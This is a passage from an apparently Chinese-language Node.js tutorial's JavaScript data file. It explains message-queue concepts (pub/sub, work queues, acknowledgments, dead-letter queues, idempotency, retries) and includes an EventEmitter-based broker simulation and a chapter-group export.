消息队列（Message Queue，简称 MQ）是一种**异步通信**机制，它允许应用程序之间通过消息进行通信，而不需要直接调用彼此的 API。消息队列是现代分布式系统的核心组件，解耦了服务之间的依赖关系。

### 消息队列的核心概念

\`\`\`
生产者（Producer）          Broker（消息代理）          消费者（Consumer）
    │                          │                          │
    ├── 发送消息 ──►           │         ──► 拉取消息 ───┤
    │                    ┌──────────┐                    │
    │                    │  Queue   │                    │
    │                    │ [m1][m2] │                    │
    │                    │ [m3][m4] │                    │
    │                    └──────────┘                    │
\`\`\`

- **生产者（Producer）**：产生消息的应用程序。
- **消费者（Consumer）**：接收和处理消息的应用程序。
- **Broker（消息代理）**：中间的消息队列服务（如 RabbitMQ、Kafka、Redis）。
- **Queue（队列）**：存储消息的缓冲区，通常遵循 FIFO（先进先出）原则。
- **Exchange（交换机）**：在 RabbitMQ 中，交换机负责接收生产者消息并路由到队列。

### 消息队列的优势

1. **解耦**：生产者和消费者不需要知道彼此的存在，它们只与消息队列交互。
2. **削峰填谷**：当流量高峰时，消息暂存在队列中，消费者按自己的能力处理，避免系统过载。
3. **异步处理**：非关键路径的操作可以异步处理（如发送邮件、生成报表），提升响应速度。
4. **可靠投递**：消息持久化到磁盘，即使服务宕机，消息也不会丢失。

---

## 消息队列模式

### 1. 点对点（Point-to-Point）

一条消息只能被一个消费者消费。消息被消费后从队列中移除。

\`\`\`
生产者 → Queue → 消费者A
                ↘ 消费者B（不会收到同一条消息）
\`\`\`

**适用场景**：任务分发、订单处理——每个任务只需一个 Worker 处理。

### 2. 发布/订阅（Publish/Subscribe）

一条消息可以被多个消费者同时消费。生产者将消息发送到 Exchange，Exchange 根据路由规则将消息分发到绑定的队列。

\`\`\`
                   ┌─ Queue1 → 消费者A（处理订单）
生产者 → Exchange ─┤
                   └─ Queue2 → 消费者B（发送通知）
                   └─ Queue3 → 消费者C（记录日志）
\`\`\`

**适用场景**：事件通知、数据同步——多个服务需要对同一事件做出反应。

### 3. 工作队列（Work Queue）

多个消费者竞争消费同一个队列中的消息，实现负载均衡。

\`\`\`
生产者 → Queue → 消费者A（处理消息1）
              → 消费者B（处理消息2）
              → 消费者A（处理消息3）
\`\`\`

**适用场景**：批量处理任务、图片处理、视频转码。

---

## 消息确认（Message Acknowledgment）

消息确认机制确保消息被消费者成功处理后才从队列中移除。如果消费者在处理消息时崩溃，消息会重新入队，由其他消费者处理。

### 确认模式

| 模式 | 说明 | 风险 |
| --- | --- | --- |
| **自动确认（autoAck）** | 消费者收到消息后立即确认 | 消息可能在处理过程中丢失 |
| **手动确认（manualAck）** | 消费者处理完消息后显式确认 | 需要确保确认逻辑正确 |
| **否定确认（nack）** | 消费者处理失败，消息重新入队 | 可能导致无限重试 |

### 确认流程

\`\`\`
1. 消费者从队列拉取消息
2. 消费者处理消息
3. 如果处理成功 → 发送 ACK → 消息从队列中移除
4. 如果处理失败 → 发送 NACK → 消息重新入队（或进入死信队列）
5. 如果消费者崩溃 → 消息超时后自动重新入队
\`\`\`

---

## 死信队列（Dead Letter Queue，DLQ）

死信队列是处理无法被正常消费的消息的机制。当消息满足以下条件之一时，会被发送到死信队列：

1. **消息被拒绝（NACK）且不重新入队**。
2. **消息过期（TTL 超时）**。
3. **队列达到最大长度**。

\`\`\`
正常队列 → 消费者处理失败(NACK) → 死信队列 → 管理员排查
         → 消息过期(超时)      → 死信队列
         → 队列满了            → 死信队列
\`\`\`

**死信队列的作用**：
- 不会丢失消息，方便后续排查。
- 隔离异常消息，不影响正常消息的处理。
- 可以设置专门的死信消费者，对异常消息进行告警或人工处理。

---

## 消息顺序保证

在分布式系统中，保证消息的顺序性是一个挑战。不同消息队列系统有不同的保证：

| 系统 | 顺序保证 | 说明 |
| --- | --- | --- |
| **RabbitMQ** | 单队列内有序 | 同一队列的消息按发送顺序消费 |
| **Kafka** | 分区内有序 | 同一 Partition 内消息有序 |
| **Redis Streams** | 流内有序 | 消息按 ID 顺序排列 |

### 保证顺序的最佳实践

1. **关键业务使用单队列/单分区**。
2. **使用消息键（Key）确保相关消息进入同一分区**。
3. **消费者端做幂等性处理**（即使消息重复，结果也一致）。
4. **在业务层添加序号或时间戳，消费端做排序**。

---

## 幂等性处理

**幂等性**是指同一个操作执行多次，产生的结果与执行一次相同。在消息队列中，由于网络重试、消费者重启等原因，消息可能会被重复投递，因此消费者必须实现幂等性。

### 实现幂等性的常见方法

1. **唯一 ID 去重**：每条消息携带唯一 ID，消费者记录已处理的消息 ID，重复消息直接跳过。
2. **数据库唯一约束**：利用数据库的唯一索引，插入重复数据会失败（但不会产生副作用）。
3. **状态机**：消息中包含目标状态，多次设置同一状态是幂等的。
4. **版本号/Optimistic Lock**：消息携带版本号，消费者只处理新版本。

\`\`\`javascript
// 幂等性处理示例
const processedMessages = new Set();

function processMessage(message) {
  // 1. 检查消息是否已处理
  if (processedMessages.has(message.id)) {
    console.log(\`消息 \${message.id} 已处理，跳过\`);
    return;
  }

  // 2. 处理业务逻辑
  doBusinessLogic(message);

  // 3. 标记为已处理
  processedMessages.add(message.id);
}
\`\`\`

---

## 消息重试策略

当消息处理失败时，需要有合理的重试策略：

| 策略 | 说明 | 适用场景 |
| --- | --- | --- |
| **立即重试** | 失败后立即重试 | 临时性错误（如网络抖动） |
| **固定间隔重试** | 每隔固定时间重试一次 | 可预期的短暂故障 |
| **指数退避** | 重试间隔逐渐增加（1s, 2s, 4s, 8s...） | 避免加重系统负担 |
| **最大重试次数** | 超过次数后进入死信队列 | 所有场景都应设置 |

---

## 消息队列在 Node.js 中的实现

虽然沙箱环境无法连接外部消息队列，但我们可以用 Node.js 内置的 \`events\` 模块模拟消息队列的核心概念。

\`\`\`javascript
const EventEmitter = require('events');

// 用 EventEmitter 模拟发布/订阅
const messageBus = new EventEmitter();

// 生产者
messageBus.emit('order.created', { orderId: 123, amount: 99 });

// 消费者
messageBus.on('order.created', (order) => {
  console.log('处理订单:', order);
});
\`\`\`

下面这段代码用 events 模块完整模拟了消息队列的核心概念。`,
    code: `// ============================================================
// 第六章代码演示：消息队列
// ============================================================
const EventEmitter = require("events");

// ---- 1. 用 events 模块模拟发布订阅消息队列 ----
console.log("===== 1. 发布订阅消息队列模拟 =====");

class MessageBroker extends EventEmitter {
  constructor() {
    super();
    this.messageLog = [];      // 消息日志
    this.queues = new Map();   // 队列存储
    this.subscribers = new Map(); // 订阅者
    this.setMaxListeners(100); // 增加最大监听器数
  }

  // 创建队列
  createQueue(queueName) {
    if (!this.queues.has(queueName)) {
      this.queues.set(queueName, []);
      console.log("创建队列:", queueName);
    }
    return this;
  }

  // 生产者：发送消息到队列
  publish(queueName, message) {
    if (!this.queues.has(queueName)) {
      this.createQueue(queueName);
    }

    const msg = {
      id: Date.now() + "-" + Math.random().toString(36).slice(2, 8),
      queue: queueName,
      data: message,
      timestamp: new Date().toISOString(),
      retryCount: 0,
      status: "pending",
    };

    this.queues.get(queueName).push(msg);
    this.messageLog.push({ ...msg, action: "PUBLISHED" });

    // 触发事件，通知订阅者
    this.emit("message:" + queueName, msg);

    console.log(
      "[" + queueName + "] 发布消息: " + msg.id + " → " + JSON.stringify(message).slice(0, 50)
    );

    return msg.id;
  }

  // 消费者：订阅队列
  subscribe(queueName, handler, options = {}) {
    if (!this.queues.has(queueName)) {
      this.createQueue(queueName);
    }

    const subscriber = {
      id: "sub-" + Date.now() + "-" + Math.random().toString(36).slice(2, 6),
      queue: queueName,
      handler,
      options: {
        autoAck: options.autoAck !== false,
        concurrency: options.concurrency || 1,
      },
      stats: { processed: 0, failed: 0 },
    };

    if (!this.subscribers.has(queueName)) {
      this.subscribers.set(queueName, []);
    }
    this.subscribers.get(queueName).push(subscriber);

    // 监听消息
    this.on("message:" + queueName, (msg) => {
      if (msg.status === "pending") {
        this._processMessage(subscriber, msg);
      }
    });

    console.log("订阅者 " + subscriber.id + " 订阅了队列 " + queueName);
    return subscriber;
  }

  // 处理消息
  _processMessage(subscriber, msg) {
    msg.status = "processing";
    msg.consumerId = subscriber.id;

    try {
      subscriber.handler(msg.data, (err) => {
        if (err) {
          this._handleNack(msg, subscriber, err);
        } else {
          this._handleAck(msg, subscriber);
        }
      });
    } catch (err) {
      this._handleNack(msg, subscriber, err);
    }
  }

  // 消息确认
  _handleAck(msg, subscriber) {
    msg.status = "acknowledged";
    msg.acknowledgedAt = new Date().toISOString();
    subscriber.stats.processed++;

    // 从队列中移除
    const queue = this.queues.get(msg.queue);
    if (queue) {
      const idx = queue.findIndex((m) => m.id === msg.id);
      if (idx !== -1) queue.splice(idx, 1);
    }

    this.messageLog.push({ id: msg.id, action: "ACK", consumer: subscriber.id });
    this.emit("ack", msg);
  }

  // 消息否定确认（NACK）
  _handleNack(msg, subscriber, error) {
    subscriber.stats.failed++;

    // 重试逻辑
    if (msg.retryCount < 3) {
      msg.retryCount++;
      msg.status = "pending";
      msg.lastError = error.message || String(error);
      console.log(
        "  [重试] " + msg.id + " 第 " + msg.retryCount + " 次重试 (错误: " + msg.lastError + ")"
      );
      this.messageLog.push({
        id: msg.id,
        action: "RETRY",
        retryCount: msg.retryCount,
        error: msg.lastError,
      });
      // 重新触发处理
      this._processMessage(subscriber, msg);
    } else {
      // 超过最大重试次数，进入死信队列
      this._moveToDeadLetter(msg, subscriber, error);
    }
  }

  // 死信队列
  _moveToDeadLetter(msg, subscriber, error) {
    msg.status = "dead-letter";
    msg.deadAt = new Date().toISOString();
    msg.finalError = error.message || String(error);
    msg.consumerId = subscriber.id;

    if (!this.queues.has("dead-letter")) {
      this.queues.set("dead-letter", []);
    }
    this.queues.get("dead-letter").push(msg);

    // 从原始队列中移除
    const queue = this.queues.get(msg.queue);
    if (queue) {
      const idx = queue.findIndex((m) => m.id === msg.id);
      if (idx !== -1) queue.splice(idx, 1);
    }

    this.messageLog.push({ id: msg.id, action: "DEAD_LETTER", error: msg.finalError });
    this.emit("dead-letter", msg);
    console.log("  [死信] " + msg.id + " 进入死信队列 (错误: " + msg.finalError + ")");
  }

  // 获取队列状态
  getQueueStatus(queueName) {
    const queue = this.queues.get(queueName) || [];
    const subs = this.subscribers.get(queueName) || [];
    return {
      name: queueName,
      messageCount: queue.length,
      pending: queue.filter((m) => m.status === "pending").length,
      processing: queue.filter((m) => m.status === "processing").length,
      deadLetter: queue.filter((m) => m.status === "dead-letter").length,
      subscriberCount: subs.length,
    };
  }

  // 获取消息日志
  getLog() {
    return this.messageLog;
  }
}

// 测试消息队列
const broker = new MessageBroker();

// 创建队列
broker.createQueue("orders");
broker.createQueue("notifications");
broker.createQueue("dead-letter");

console.log("\\n--- 发布/订阅模式 ---");

// 订阅者1：处理订单
broker.subscribe("orders", (data, ack) => {
  console.log("  [订单处理] 处理订单 #" + data.orderId + "，金额: " + data.amount);
  ack(); // 成功确认
});

// 订阅者2：发送通知
broker.subscribe("orders", (data, ack) => {
  console.log("  [通知服务] 发送订单确认通知，订单 #" + data.orderId);
  ack();
});

// 订阅者3：记录日志
broker.subscribe("orders", (data, ack) => {
  console.log("  [日志服务] 记录订单日志，订单 #" + data.orderId);
  ack();
});

// 发布消息
broker.publish("orders", { orderId: 1001, amount: 299 });
broker.publish("orders", { orderId: 1002, amount: 599 });

console.log("\\n--- 点对点模式（工作队列）---");

// 工作队列：多个消费者竞争消费
broker.createQueue("tasks");

// 发布任务
broker.publish("tasks", { taskId: 1, type: "resize-image", file: "photo1.jpg" });
broker.publish("tasks", { taskId: 2, type: "resize-image", file: "photo2.jpg" });
broker.publish("tasks", { taskId: 3, type: "resize-image", file: "photo3.jpg" });

// 工作消费者1
broker.subscribe("tasks", (data, ack) => {
  console.log("  [Worker-1] 处理任务 #" + data.taskId + ": " + data.type);
  ack();
});

// 工作消费者2
broker.subscribe("tasks", (data, ack) => {
  console.log("  [Worker-2] 处理任务 #" + data.taskId + ": " + data.type);
  ack();
});

console.log("\\n--- 消息确认与重试 ---");

// 订阅者：有时处理失败
broker.createQueue("critical-jobs");

broker.subscribe("critical-jobs", (data, ack) => {
  if (data.jobId === 2) {
    // 模拟处理失败
    console.log("  [关键任务] 任务 #" + data.jobId + " 处理失败！");
    ack(new Error("处理超时"));
  } else {
    console.log("  [关键任务] 任务 #" + data.jobId + " 处理成功");
    ack();
  }
});

broker.publish("critical-jobs", { jobId: 1, payload: "数据A" });
broker.publish("critical-jobs", { jobId: 2, payload: "数据B" }); // 会失败并重试
broker.publish("critical-jobs", { jobId: 3, payload: "数据C" });

console.log("\\n--- 死信队列 ---");

// 监听死信队列
broker.on("dead-letter", (msg) => {
  console.log("  [死信监控] 检测到死信消息: " + msg.id);
  console.log("    原始队列: " + msg.queue);
  console.log("    失败原因: " + msg.finalError);
  console.log("    重试次数: " + msg.retryCount);
});

console.log("\\n--- 幂等性处理 ---");

// 幂等性消费者：记录已处理的消息 ID
const processedIds = new Set();

broker.createQueue("payments");

broker.subscribe("payments", (data, ack) => {
  if (processedIds.has(data.paymentId)) {
    console.log("  [支付处理] 支付 #" + data.paymentId + " 已处理过，跳过（幂等性）");
    ack();
    return;
  }

  console.log("  [支付处理] 处理支付 #" + data.paymentId + "，金额: " + data.amount);
  processedIds.add(data.paymentId);
  ack();
});

// 发布支付消息
broker.publish("payments", { paymentId: "PAY-001", amount: 100 });
// 模拟重复消息
broker.publish("payments", { paymentId: "PAY-001", amount: 100 }); // 重复消息
broker.publish("payments", { paymentId: "PAY-002", amount: 200 });

// 等待处理完成后查看状态
setTimeout(() => {
  console.log("\\n--- 队列状态 ---");
  console.log("orders 队列:", broker.getQueueStatus("orders"));
  console.log("tasks 队列:", broker.getQueueStatus("tasks"));
  console.log("critical-jobs 队列:", broker.getQueueStatus("critical-jobs"));
  console.log("payments 队列:", broker.getQueueStatus("payments"));
  console.log("dead-letter 队列:", broker.getQueueStatus("dead-letter"));

  console.log("\\n--- 消息日志 ---");
  const log = broker.getLog();
  console.log("共 " + log.length + " 条日志，最近 10 条:");
  console.table(log.slice(-10).map((l) => ({
    消息ID: l.id ? l.id.slice(-8) : "N/A",
    动作: l.action,
    队列: l.queue || "N/A",
    错误: l.error || "无",
  })));

  // ---- 7. 消息队列总结 ----
  console.log("\\n===== 7. 消息队列总结 =====");
  const summary = [
    { 概念: "发布/订阅", 说明: "一条消息多消费者，用于事件通知", 实现: "EventEmitter + 队列分离" },
    { 概念: "点对点/工作队列", 说明: "一条消息一消费者，用于任务分发", 实现: "多个消费者竞争同一队列" },
    { 概念: "消息确认(ACK)", 说明: "处理成功后才确认，防止消息丢失", 实现: "回调函数显式确认" },
    { 概念: "否定确认(NACK)", 说明: "处理失败后重新入队或重试", 实现: "重试次数限制 + 错误记录" },
    { 概念: "死信队列(DLQ)", 说明: "无法处理的消息进入死信队列", 实现: "超过重试次数后转移到 DLQ" },
    { 概念: "幂等性", 说明: "重复消息不产生副作用", 实现: "已处理ID集合 + 去重检查" },
    { 概念: "消息重试", 说明: "失败后自动重试，最多3次", 实现: "重试计数器 + 状态重置" },
    { 概念: "消息顺序", 说明: "单队列内消息有序消费", 实现: "FIFO + 消息ID排序" },
  ];
  console.table(summary);
}, 500);`,
  },
];

// =============================================================
// 章节分组导出
// =============================================================
export const chapterGroups = [
  {
    id: "node-profiling",
    group: "进阶实战补充",
    title: "性能分析与优化",
    icon: "📊",
    chapters: ["node-profiling"],
  },
  {
    id: "node-memory-leak",
    group: "进阶实战补充",
    title: "内存泄漏检测与修复",
    icon: "💧",
    chapters: ["node-memory-leak"],
  },
  {
    id: "node-security",
    group: "进阶实战补充",
    title: "安全最佳实践",
    icon: "🔒",
    chapters: ["node-security"],
  },
  {
    id: "node-caching",
    group: "进阶实战补充",
    title: "缓存策略",
    icon: "🗄️",
    chapters: ["node-caching"],
  },
  {
    id: "node-database",
    group: "进阶实战补充",
    title: "数据库集成",
    icon: "💾",
    chapters: ["node-database"],
  },
  {
    id: "node-message-queue",
    group: "进阶实战补充",
    title: "消息队列",
    icon: "📨",
    chapters: ["node-message-queue"],
  },
];